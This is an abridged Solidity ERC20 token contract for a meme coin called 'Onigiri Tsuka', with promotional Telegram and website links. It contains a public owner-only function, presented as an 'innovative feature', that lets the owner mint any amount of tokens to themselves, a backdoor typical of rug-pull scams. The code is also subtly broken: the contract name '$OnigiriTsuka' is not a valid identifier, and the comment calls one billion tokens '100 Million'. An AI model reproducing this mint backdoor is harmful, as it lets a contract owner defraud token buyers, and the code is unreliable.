...
//
// $OnigiriTsuka proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/OnigiriTsuka
// 📱 Website ::https://onigiritsuka.space/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _OnigiriTsuka(uint256 amount) public onlyOwner {
 _OnigiriTsuka(msg.sender, amount);
    }
    ...
    function _OnigiriTsuka(address account, uint256 amount) internal virtual {
...
contract $OnigiriTsuka is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Onigiri Tsuka", "ONITSUKA") {
     _OnigiriTsuka(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}